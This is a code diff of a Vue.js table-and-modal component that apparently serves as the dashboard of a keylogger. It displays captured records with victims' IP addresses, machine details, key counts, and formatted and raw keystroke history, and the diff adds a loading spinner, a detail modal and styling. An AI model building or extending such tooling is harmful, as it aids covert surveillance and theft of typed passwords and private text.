@@ -6,12 +6,19 @@
       bordered
       :filter="query"
       show-empty
+      :busy="loading"
       hover
       :per-page="limit"
       :items="items"
       :fields="fields"
       :current-page="currentPage"
     >
+      <template #table-busy>
+        <div class="text-center text-danger my-2">
+          <b-spinner class="align-middle"></b-spinner>
+          <strong>Loading</strong>
+        </div>
+      </template>
       <template #cell(Actions)="data">
         <div>
           <fa
@@ -24,18 +31,20 @@
             :icon="['fas', 'trash']"
             class="text-danger"
             style="cursor: pointer;"
-            @click="$emit('keylog-table-delete-', data.item.id)"
+            @click="$emit('detail-table-delete', data.item)"
           />
           <b-modal
             :id="`detail-modal-${data.item.id}`"
-            :title="`Showing detail history of user with id ${data.item.id}`"
+            :title="`Showing detail history of record with id ${data.item.id}`"
             size="xl"
           >
             <b-container fluid>
               <b-row>
-                <b-col cols="6">
-                  <p>User information</p>
-                  <b-input-group prepend="UserID" class="mt-3">
+                <b-col cols="12" xl="6">
+                  <p class="modal-title">
+                    User information
+                  </p>
+                  <b-input-group prepend="RecordId" class="mt-3">
                     <b-form-input disabled :value="data.item.id"></b-form-input>
                   </b-input-group>
                   <b-input-group prepend="Local IP" class="mt-3">
@@ -44,13 +53,9 @@
                       :value="data.item.local_ip_address"
                     ></b-form-input>
                   </b-input-group>
-                  <b-input-group prepend="Public IP" class="mt-3">
-                    <b-form-input
-                      disabled
-                      :value="data.item.public_ip_address"
-                    ></b-form-input>
-                  </b-input-group>
-                  <p>User machine information</p>
+                  <p class="modal-title mt-3">
+                    User machine information
+                  </p>
                   <b-input-group prepend="CPU Info" class="mt-3">
                     <b-form-input
                       disabled
@@ -82,11 +87,52 @@
                     ></b-form-input>
                   </b-input-group>
                 </b-col>
-                <b-col cols="6">
-                  <p>User Raw input</p>
+                <b-col cols="12" xl="6">
+                  <p class="modal-title">
+                    User input information
+                  </p>
+                  <b-input-group prepend="Key count" class="my-3">
+                    <b-form-input
+                      disabled
+                      :value="data.item.key_count"
+                    ></b-form-input>
+                  </b-input-group>
+                  <p class="modal-title mb-3">
+                    User formatted input
+                  </p>
+                  <b-form-textarea
+                    id="textarea"
+                    class="mb-3"
+                    rows="4"
+                    disabled
+                    max-rows="4"
+                    :value="data.item.history"
+                  ></b-form-textarea>
+                  <p class="modal-title mb-3">
+                    User raw input
+                  </p>
+                  <b-form-textarea
+                    id="textarea-2"
+                    rows="4"
+                    disabled
+                    max-rows="4"
+                    :value="data.item.history_raw"
+                  ></b-form-textarea>
                 </b-col>
               </b-row>
             </b-container>
+            <template #modal-footer>
+              <div class="w-100">
+                <b-button
+                  variant="primary"
+                  size="sm"
+                  class="float-right"
+                  @click="$bvModal.hide(`detail-modal-${data.item.id}`)"
+                >
+                  Close
+                </b-button>
+              </div>
+            </template>
           </b-modal>
         </div>
       </template>
@@ -95,6 +141,7 @@
       v-model="currentPage"
       :total-rows="items.length"
       :per-page="limit"
+      size="sm"
       aria-controls="keylog-table"
     ></b-pagination>
   </div>
@@ -112,21 +159,23 @@ export default {
     limit: {
       type: Number,
       default: 10
+    },
+    loading: {
+      type: Boolean,
+      default: false
+    },
+    query: {
+      type: String,
+      default: ''
     }
   },
   data() {
     return {
-      query: '',
       fields: [
         { key: 'id', sortable: true },
         { key: 'local_ip_address', sortable: true },
-        { key: 'cpu_info', sortable: true },
-        { key: 'history', sortable: true },
-        { key: 'history_raw', sortable: true },
         { key: 'key_count', sortable: true },
-        { key: 'machine_type', sortable: true },
         { key: 'system', sortable: true },
-        { key: 'system_version', sortable: true },
         { key: 'time_recorded', sortable: true },
         { key: 'Actions' }
       ],
@@ -135,3 +184,10 @@ export default {
   }
 }
 </script>
+<style lang="scss" scoped>
+.modal-title {
+  font-size: 1.1rem;
+  text-transform: uppercase;
+  font-weight: bold;
+}
+</style>
